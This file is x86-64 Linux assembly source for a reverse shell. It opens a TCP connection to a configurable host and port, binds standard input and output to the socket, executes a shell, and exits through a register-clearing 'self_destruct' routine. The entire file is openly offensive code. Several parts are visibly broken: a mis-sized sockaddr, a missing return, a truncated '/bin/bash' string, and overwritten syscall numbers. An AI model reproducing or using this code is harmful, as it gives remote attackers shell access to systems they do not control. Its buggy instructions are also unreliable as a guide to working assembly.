section .data
    sockaddr:
        dw 2               ; AF_INET
        dd 0x5C11          ; change if need(4444)
        dd 0x7F000001      ;change if need (127.0.0.1)
        dq 0               ; protocol

section .bss
    socket_fd resq 1
    buffer resb 4096          ; data buffer


section .text
    global _start


_start:
call socket_start
call connect_your_server
call spawn_shell
call start_bash
call exit_shell
call self_destruct

socket_start:
    mov rax, 41              ; sys_socket
    mov rdi, 2               ; AF_INET
    mov rsi, 1               ; SOCKET_STREAM (TCP)
    mov rdx, 0               ; protocol
    syscall
    mov [socket_fd], rax     ; save namber socket

connect_your_server:
    mov rax, 42               ; sys_connect
    mov rdi, [socket_fd]      ; socket_fd -> rdi
    lea rsi, [sockaddr]       ; create socket
    mov rdx, 16
    syscall
    test rax, rax
    ret

spawn_shell:
    mov rdi, [socket_fd]      ; rdi -> socket num

    xor rsi, rsi
    mov al, 33                ; stdin
    syscall

    inc rsi
    mov al, 33                ; stdout
    syscall

    inc al
    mov al, 33                ;stderr
    syscall

start_bash:
    mov al, 59
    mov rax, 0x7361622f6e69622f     ; '/bin/bash'
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

exit_shell:
    mov rax, 0
    mov rdi, [socket_fd]
    xor rsi, rsi
    xor rdx, rdx
    syscall
    test rax, rax               ; test disconnet(can delete)
    jle self_destruct

self_destruct:
    xor al, al
    xor rdi, rdi
    xor rsi, rsi
    xor rsp, rsp
    xor rax, rax              ; full delete registr
    xor rbx, rbx
    xor rcx, rcx
    xor r8, r8
    xor r9, r9
    xor r10, r10
    xor r11, r11
    xor r12, r12
    xor r13, r13
    xor r14, r14
    xor r15, r15

    mov rax, 60               ; exit
    xor rdi, rdi
    syscall
